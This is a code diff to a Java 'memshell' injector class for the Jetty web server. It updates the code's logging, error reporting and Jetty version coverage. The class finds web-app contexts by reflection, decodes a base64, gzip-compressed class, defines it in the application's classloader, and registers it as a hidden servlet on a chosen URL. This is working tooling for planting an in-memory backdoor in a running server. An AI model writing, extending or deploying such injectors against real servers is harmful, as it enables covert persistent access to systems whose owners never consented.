@@ -3,6 +3,7 @@ package com.reajason.javaweb.memshell.injector.jetty;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.*;
 import java.util.ArrayList;
 import java.util.List;
@@ -15,17 +16,7 @@ import java.util.zip.GZIPInputStream;
  */
 public class JettyServletInjector {
 
-    public JettyServletInjector() {
-        try {
-            List<Object> contexts = getContext();
-            for (Object context : contexts) {
-                Object servlet = getShell(context);
-                inject(context, servlet);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
+    private String msg = "";
 
     public String getUrlPattern() {
         return "{{urlPattern}}";
@@ -37,6 +28,45 @@ public class JettyServletInjector {
 
     public String getBase64String() throws IOException {
         return "{{base64Str}}";
+    }
+
+    public JettyServletInjector() {
+        List<Object> contexts = null;
+        try {
+            contexts = getContext();
+        } catch (Throwable throwable) {
+            msg += "context error: " + getErrorMessage(throwable);
+        }
+        if (contexts != null) {
+            for (Object context : contexts) {
+                msg += ("context: [" + getContextRoot(context) + "] ");
+                try {
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += "[" + getUrlPattern() + "] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
+                }
+            }
+        }
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(context, "getContextPath");
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     public Class<?> getServletClass(ClassLoader classLoader) throws ClassNotFoundException {
@@ -87,32 +117,33 @@ public class JettyServletInjector {
 
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader webAppClassLoader = getWebAppClassLoader(context);
+        ClassLoader classLoader = getWebAppClassLoader(context);
+        Class<?> clazz = null;
         try {
-            return webAppClassLoader.loadClass(getClassName()).newInstance();
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(webAppClassLoader, clazzByte, 0, clazzByte.length);
-            return clazz.newInstance();
+            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
+        return clazz.newInstance();
     }
 
     public void inject(Object context, Object servlet) throws Exception {
         Object servletHandler = getFieldValue(context, "_servletHandler");
 
         if (invokeMethod(servletHandler, "getServlet", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
-            System.out.println("servlet is already injected");
             return;
         }
-
 
         String[] classNames = new String[]{
                 "org.eclipse.jetty.servlet.ServletHolder",
                 "org.eclipse.jetty.ee8.servlet.ServletHolder",
                 "org.eclipse.jetty.ee9.servlet.ServletHolder",
                 "org.eclipse.jetty.ee10.servlet.ServletHolder",
+                "org.eclipse.jetty.ee11.servlet.ServletHolder",
                 "org.mortbay.jetty.servlet.ServletHolder",
         };
 
@@ -137,9 +168,12 @@ public class JettyServletInjector {
         invokeMethod(servletHolder, "setName", new Class[]{String.class}, new Object[]{getClassName()});
         invokeMethod(servletHandler, "addServlet", new Class[]{servletHolderClass}, new Object[]{servletHolder});
         invokeMethod(servletHandler, "addServletWithMapping", new Class[]{servletHolderClass, String.class}, new Object[]{servletHolder, getUrlPattern()});
-        System.out.println("servlet inject successful");
     }
 
+    @Override
+    public String toString() {
+        return msg;
+    }
 
     @SuppressWarnings("all")
     public static byte[] decodeBase64(String base64Str) throws Exception {
@@ -186,7 +220,7 @@ public class JettyServletInjector {
                 clazz = clazz.getSuperclass();
             }
         }
-        throw new NoSuchFieldException();
+        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
     }
 
     public static Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
@@ -218,6 +252,21 @@ public class JettyServletInjector {
             throw e;
         } catch (Exception e) {
             throw new RuntimeException("Error invoking method: " + methodName, e);
+        }
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
         }
     }
 }
